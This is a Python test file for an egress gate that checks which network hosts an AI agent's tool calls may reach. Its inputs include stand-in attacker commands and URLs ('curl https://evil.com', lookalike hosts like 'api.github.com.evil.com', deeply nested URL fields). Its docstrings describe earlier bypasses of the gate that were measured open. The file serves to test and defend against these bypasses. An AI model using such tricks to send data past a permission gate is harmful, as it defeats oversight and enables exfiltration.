"""
Tests for Gate 3 — egress control, after the 2026-08-22 rework.

Two changes are under test, each of which closed a hole that was measured open:

  1. A destination carried in a STRUCTURED FIELD is now checked. The gate used to read
     only `command`, and the caller used to run it only when `tool == "bash"`, so
     `{"url": "https://evil.com"}` from WebFetch, an MCP tool, or an in-process tool
     passed without being looked at.
  2. Destinations are compared by HOST, not by substring. `curl
     https://api.github.com.evil.com` was ALLOW with `api.github.com` on the allowlist.

Both directions are asserted: the bypasses deny, and the ordinary commands that the
permissive substring test used to wave through still pass. A fix that denies everything
would pass half of this file, so the allow cases are the load-bearing half.

Run:
    python3 tests/test_egress.py
    python3 -m pytest tests/test_egress.py -v
"""
import json
import sys
import tempfile
from contextlib import contextmanager
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT / "governance"))
import permission  # noqa: E402


@contextmanager
def allowlist(hosts, tools=()):
    """Point the gate at a temporary `egress_hosts` policy.

    `tools` matters only for the tests that go through `make_permission_check`, where
    Gate 2 runs first and would otherwise deny an unregistered tool before Gate 3 is
    reached — which would make this file pass while measuring the wrong gate.
    """
    with tempfile.TemporaryDirectory() as tmp:
        path = Path(tmp) / "mcp-allowlist.json"
        path.write_text(json.dumps({
            "tools": [{"name": n, "description": n, "version": "1.0"} for n in tools],
            "egress_hosts": hosts,
        }))
        original = permission.ALLOWLIST_PATH
        permission.ALLOWLIST_PATH = path
        try:
            yield
        finally:
            permission.ALLOWLIST_PATH = original


def _denied(command="", tool_input=None):
    return permission.check_egress(command, tool_input) is not None


# ---------------------------------------------------------------------------
# 1. Structured destination fields — the shape that used to be invisible
# ---------------------------------------------------------------------------

def test_structured_url_is_checked():
    """The capability the old gate lacked entirely."""
    with allowlist(["localhost"]):
        assert _denied(tool_input={"url": "https://evil.com"})
        assert not _denied(tool_input={"url": "http://localhost:3000/x"})


def test_every_destination_field_name_is_checked():
    with allowlist(["localhost"]):
        for field in sorted(permission.EGRESS_TARGET_FIELDS):
            assert _denied(tool_input={field: "https://evil.com"}), \
                f"destination field '{field}' was not checked"


def test_destination_field_is_matched_case_insensitively():
    with allowlist(["localhost"]):
        assert _denied(tool_input={"URL": "https://evil.com"})
        assert _denied(tool_input={"Webhook_Url": "https://evil.com"})


def test_nested_destination_is_found():
    """A URL inside a list inside a dict is the same URL."""
    with allowlist(["localhost"]):
        assert _denied(tool_input={"items": [{"endpoint": "https://evil.com"}]})
        assert _denied(tool_input={"a": {"b": {"c": {"url": "https://evil.com"}}}})


def test_destination_field_holding_a_list_is_checked_item_by_item():
    """One allowed entry must not launder the disallowed one beside it."""
    with allowlist(["localhost", "127.0.0.1"]):
        assert _denied(tool_input={"url": ["http://localhost", "https://evil.com"]})
        assert not _denied(tool_input={"url": ["http://localhost", "http://127.0.0.1"]})


def test_depth_ceiling_denies_instead_of_reporting_nothing():
    """The bypass that a bare `return` at the ceiling creates.

    A generator that stops yielding when it runs out of depth is indistinguishable, to
    the caller, from a payload with no destination in it — which the caller reads as
    ALLOW. Nesting depth is attacker-controlled, so that is a one-line bypass. Measured
    on dev_fengmin 2026-08-21: the same destination nested 9 deep was ALLOW while the
    flat form was DENY.

    Note the deny holds even for an ALLOWED host: the verdict is "not verifiable", not
    "not permitted", and both must fail closed.
    """
    def nest(levels, url):
        node = {"url": url}
        for _ in range(levels):
            node = {"a": node}
        return node

    with allowlist(["localhost"]):
        assert not _denied(tool_input=nest(permission._MAX_EGRESS_SCAN_DEPTH, "http://localhost"))
        for extra in (1, 2, 6):
            deep = nest(permission._MAX_EGRESS_SCAN_DEPTH + extra, "http://localhost")
            reason = permission.check_egress("", deep)
            assert reason is not None, f"payload nested {extra} past the ceiling was ALLOW"
            assert "not verifiable" in reason, reason


def test_unreadable_destination_denies():
    """A field that carries no host is a destination we cannot verify."""
    with allowlist(["localhost"]):
        assert _denied(tool_input={"url": "   "})


def test_payload_with_no_destination_is_not_touched():
    """The old `if tool == "bash"` guard bought nothing; this is why removing it is safe."""
    with allowlist(["localhost"]):
        assert not _denied(tool_input={"file_path": "notes.md", "content": "hello"})
        assert not _denied(tool_input={"pattern": "TODO", "path": "src/"})
        assert not _denied(tool_input={})


# ---------------------------------------------------------------------------
# 2. Host comparison replaces substring comparison
# ---------------------------------------------------------------------------

def test_lookalike_suffix_host_is_denied():
    """The bypass measured open on BOTH main and dev_fengmin, 2026-08-21."""
    with allowlist(["api.github.com"]):
        assert _denied("curl https://api.github.com.evil.com/x")
        assert _denied("curl https://api.github.com.evil.com/x", {})
        assert not _denied("curl https://api.github.com/x")


def test_lookalike_without_a_scheme_is_denied():
    with allowlist(["localhost"]):
        assert _denied("curl localhost.evil.com")
        assert not _denied("curl localhost")


def test_lookalike_in_a_flag_value_is_denied():
    """`=` is split as a separator so the destination is judged, not the whole flag."""
    with allowlist(["localhost"]):
        assert _denied("curl --url=http://localhost.evil.com/x")
        assert not _denied("curl --url=http://localhost/x")


def test_subdomain_needs_an_explicit_wildcard():
    """Implicit suffix matching is refused — see `_host_allowed`.

    With `s3.amazonaws.com` allowed, implicit suffix matching would permit
    `attacker-bucket.s3.amazonaws.com`, a destination anyone can register.
    """
    with allowlist(["s3.amazonaws.com"]):
        assert _denied(tool_input={"url": "https://attacker-bucket.s3.amazonaws.com/x"})
        assert not _denied(tool_input={"url": "https://s3.amazonaws.com/x"})
    with allowlist(["*.internal.example.com"]):
        assert not _denied(tool_input={"url": "https://api.internal.example.com/x"})
        assert not _denied(tool_input={"url": "https://internal.example.com/x"})
        assert _denied(tool_input={"url": "https://internal.example.com.evil.com/x"})


def test_host_is_normalised_before_comparison():
    """Port, path, userinfo, case and a trailing dot are not part of the host."""
    with allowlist(["api.example.com"]):
        for target in ("https://api.example.com:8443/v1?a=b",
                       "https://user:pw@api.example.com/x",
                       "API.EXAMPLE.COM",
                       "https://api.example.com./x"):
            assert not _denied(tool_input={"url": target}), f"rejected {target}"


# ---------------------------------------------------------------------------
# 3. The allow side — ordinary commands must not regress
# ---------------------------------------------------------------------------

def test_ordinary_allowed_commands_still_pass():
    with allowlist(["localhost", "127.0.0.1"]):
        for command in (
            "curl http://localhost:8000/health",
            "curl -o report.txt http://localhost:8000/report",
            "curl -sS -X POST -d '{\"a\":1}' http://localhost:8000/api",
            "nc 127.0.0.1 8000",
            "wget http://127.0.0.1/file.tar.gz",
            "ssh user@localhost",
        ):
            assert not _denied(command), f"regressed on a legitimate command: {command}"


def test_commands_with_no_network_token_are_not_examined():
    with allowlist(["localhost"]):
        for command in ("echo hello", "python3 -m pytest -q", "git status"):
            assert not _denied(command)


def test_unlisted_host_is_still_denied():
    with allowlist(["localhost"]):
        assert _denied("curl https://evil.com")
        assert _denied("wget https://evil.com/x")


def test_empty_allowlist_denies_every_destination():
    with allowlist([]):
        assert _denied("curl https://anything.example.com")
        assert _denied(tool_input={"url": "https://anything.example.com"})


def test_malformed_allowlist_value_denies_rather_than_allows():
    """A policy value of the wrong type must not read as "everything is allowed"."""
    with tempfile.TemporaryDirectory() as tmp:
        path = Path(tmp) / "mcp-allowlist.json"
        path.write_text(json.dumps({"egress_hosts": "localhost"}))  # str, not list
        original = permission.ALLOWLIST_PATH
        permission.ALLOWLIST_PATH = path
        try:
            assert _denied(tool_input={"url": "http://localhost/x"})
        finally:
            permission.ALLOWLIST_PATH = original


# ---------------------------------------------------------------------------
# 4. The gate runs for every tool, not just bash
# ---------------------------------------------------------------------------

class _Block:
    def __init__(self, name, tool_input):
        self.name = name
        self.input = tool_input


def test_gate_three_is_no_longer_bash_only():
    """Before this change, a non-bash tool never reached Gate 3 at all.

    `web_fetch` is registered in the temporary allowlist on purpose: an unregistered
    name is denied by Gate 2, which would let this test pass while proving nothing about
    Gate 3.
    """
    check = permission.make_permission_check()
    with allowlist(["localhost"], tools=["web_fetch"]):
        allowed, reason = check(_Block("web_fetch", {"url": "https://evil.com"}))
        assert allowed is False, "a non-bash tool carrying a URL was not egress-checked"
        assert "egress" in reason, reason

        allowed, reason = check(_Block("web_fetch", {"url": "http://localhost/x"}))
        assert allowed is True, f"an allowed host was denied at some other gate: {reason}"


if __name__ == "__main__":
    try:
        import pytest
        sys.exit(pytest.main([__file__, "-v"]))
    except ImportError:
        tests = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
        passed = failed = 0
        for t in tests:
            try:
                t(); print(f"  \033[32m✓ PASS\033[0m  {t.__name__}"); passed += 1
            except AssertionError as e:
                print(f"  \033[31m✗ FAIL\033[0m  {t.__name__}: {e}"); failed += 1
        print(f"\nResults: {passed} passed, {failed} failed")
        sys.exit(1 if failed else 0)
